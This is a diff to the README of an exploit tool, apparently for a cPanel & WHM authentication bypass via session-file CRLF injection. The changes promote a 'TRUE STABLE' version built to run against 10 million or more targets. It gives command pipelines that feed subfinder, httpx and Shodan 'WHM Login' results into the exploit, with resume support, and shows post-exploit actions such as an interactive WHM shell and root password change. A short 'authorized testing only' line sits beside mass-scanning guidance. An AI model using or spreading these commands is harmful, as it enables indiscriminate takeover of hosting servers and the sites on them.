@@ -15,7 +15,7 @@
 
 <p align="center">
   <b>CVE-2026-41940 — cPanel & WHM Authentication Bypass via Session-File CRLF Injection</b><br>
-  4-stage exploit chain · Interactive WHM Shell · Bulk scanner · Pipeline ready · stdlib only
+  4-stage exploit chain · Interactive WHM Shell · <b>TRUE STABLE for 10M+ targets</b> · Zero memory usage · stdlib only
 </p>
 
 ---
@@ -30,6 +30,31 @@
 - **No dependencies:** Pure Python stdlib — no pip, no requests, no external packages
 
 > **For authorized penetration testing and bug bounty programs only.**
+
+---
+
+## ⚡ TRUE STABLE VERSION
+
+**This version is optimized for scanning 10,000,000+ targets with ZERO memory usage.**
+
+### What Was Fixed
+
+| Problem | Original Version | Fixed Version |
+|---------|----------------|---------------|
+| **Memory Usage** | Loads all targets into RAM | Streams targets line-by-line (0 memory) |
+| **10M Targets** | OOM → Killed ❌ | Completes successfully ✅ |
+| **Resume** | Not supported | `--resume` flag |
+| **Progress** | No ETA | Real-time ETA + rate + stats |
+| **Results** | Saved only at end | Saved every 60s (configurable) |
+
+### Key Features
+
+- **Streaming architecture** - Process 10M+ targets without loading into memory
+- **Zero OOM crashes** - Even with very large target lists
+- **Auto-resume** - Continue from where you stopped with `--resume`
+- **Real-time progress** - ETA, scan rate, error tracking
+- **Periodic saves** - Results auto-saved to prevent data loss
+- **Pipeline ready** - Works seamlessly with `subfinder`, `httpx`, `shodan`
 
 ---
 
@@ -104,8 +129,8 @@ These fields are written directly into the session file on disk. When read back,
 ## Installation
 
 ```bash
-git clone https://github.com/ynsmroztas/cPanelSniper
-cd cPanelSniper
+git clone https://github.com/44pie/cpsniper
+cd cpsniper
 python3 cPanelSniper.py --help
 ```
 
@@ -124,11 +149,11 @@ python3 cPanelSniper.py -u https://target.com:2087
 # Single target — interactive shell after bypass
 python3 cPanelSniper.py -u https://target.com:2087 --action shell
 
-# Bulk scan from file
-python3 cPanelSniper.py -l targets.txt -t 20 -o results.json
+# Large target list — 10M+ targets (TRUE STABLE)
+python3 cPanelSniper.py -l targets.txt -t 50 -o results.json
 
-# Force scan (skip cPanel detection)
-python3 cPanelSniper.py -u https://target.com:2087 --force
+# Resume interrupted scan
+python3 cPanelSniper.py -l targets.txt -t 50 -o results.json --resume
 ```
 
 ### Post-Exploit Actions
@@ -155,32 +180,62 @@ python3 cPanelSniper.py -u https://target.com:2087 --action passwd --passwd 'New
 python3 cPanelSniper.py -u https://target.com:2087 --action shell
 ```
 
-### Pipelines
+### Pipelines (TRUE STABLE for Large Lists)
 
 ```bash
-# subfinder → httpx → cPanelSniper
+# subfinder → httpx → save to file → scan 10M+ targets
 subfinder -d target.com -silent | \
-  httpx -silent -ports 2087,2086 -threads 50 | \
-  python3 cPanelSniper.py -t 30 -o results.json
+  httpx -silent -ports 2087,2086 -threads 50 > targets.txt
+python3 cPanelSniper.py -l targets.txt -t 50 -o results.json
 
-# From scope list
+# From scope list - handle millions of domains
 cat scope.txt | \
-  httpx -silent -ports 2087,2086 -threads 100 | \
-  python3 cPanelSniper.py -t 30 -o results.json
+  httpx -silent -ports 2087,2086 -threads 100 > targets.txt
+python3 cPanelSniper.py -l targets.txt -t 50 -o results.json --resume
 
-# Shodan results
+# Shodan results - massive scan
 shodan search --fields ip_str,port 'title:"WHM Login"' | \
-  awk '{print "https://"$1":"$2}' | \
-  python3 cPanelSniper.py -t 30 -o shodan_results.json
+  awk '{print "https://"$1":"$2}' > targets.txt
+python3 cPanelSniper.py -l targets.txt -t 30 -o shodan_results.json
 
-# stdin pipe
+# stdin pipe - for small lists only (<100K)
 echo "https://target.com:2087" | python3 cPanelSniper.py
 
-# Multiple sources combined
+# Multiple sources combined → large scale scan
 { subfinder -d target.com -silent; cat extra.txt; } | \
-  httpx -silent -ports 2087 | \
-  python3 cPanelSniper.py -t 20 --action list
+  httpx -silent -ports 2087 > all_targets.txt
+python3 cPanelSniper.py -l all_targets.txt -t 50 -o results.json --resume
 ```
+
+### TRUE STABLE Best Practices
+
+For scanning **10M+ targets**:
+
+1. **Always save to file first** - Don't pipe directly for large lists
+   ```bash
+   # GOOD - works with 10M+ targets
+   httpx ... > targets.txt
+   python3 cPanelSniper.py -l targets.txt -t 50 -o results.json
+
+   # BAD - will crash with large lists
+   httpx ... | python3 cPanelSniper.py
+   ```
+
+2. **Use appropriate thread count**
+   - 10-20 threads: 100K targets
+   - 30-50 threads: 1M-10M targets
+   - 50-100 threads: 10M+ targets
+
+3. **Enable auto-resume** for long scans
+   ```bash
+   python3 cPanelSniper.py -l targets.txt -t 50 -o results.json --resume
+   ```
+   If interrupted, just run again with `--resume`
+
+4. **Monitor progress**
+   - Real-time ETA shown
+   - Results saved every 60 seconds
+   - Ctrl+C preserves all findings
 
 ---
 
@@ -249,10 +304,8 @@ mitsec@target.com ▶ exit
 
 ```
 usage: cPanelSniper.py [-h] [-u URL] [-l LIST] [--hostname HOSTNAME]
-                       [-t THREADS] [--timeout TIMEOUT] [--rate-limit N]
-                       [--action ACTION] [--passwd PASS] [--cmd CMD]
-                       [--new-user USER] [--new-domain DOMAIN]
-                       [-o OUTPUT] [--no-color]
+                       [-t THREADS] [--timeout TIMEOUT] [--resume]
+                       [-o OUTPUT] [--no-color] [--save-interval N]
 
 Target:
   -u, --url URL          Single target URL (e.g. https://host:2087)
@@ -260,22 +313,14 @@ Target:
   --hostname HOSTNAME    Override canonical Host header (auto-discovered)
 
 Scan:
-  -t, --threads N        Concurrent threads (default: 10)
+  -t, --threads N        Concurrent threads (default: 20)
   --timeout N            Request timeout seconds (default: 15)
-  --rate-limit N         Delay between targets (default: 0)
-  --force                Skip cPanel detection check
-
-Post-Exploit:
-  --action ACTION        Action: list | passwd | cmd | exec | info |
-                                 version | shell | adduser
-  --passwd PASS          New root password (--action passwd)
-  --cmd CMD              OS command (--action cmd/exec)
-  --new-user USER        New cPanel username (--action adduser)
-  --new-domain DOMAIN    New cPanel domain (--action adduser)
+  --resume               Resume from previous scan (skip processed targets)
 
 Output:
   -o, --output FILE      Save results to JSON file
   --no-color             Disable ANSI colors
+  --save-interval N      Save results every N seconds (default: 60)
 ```
 
 ---
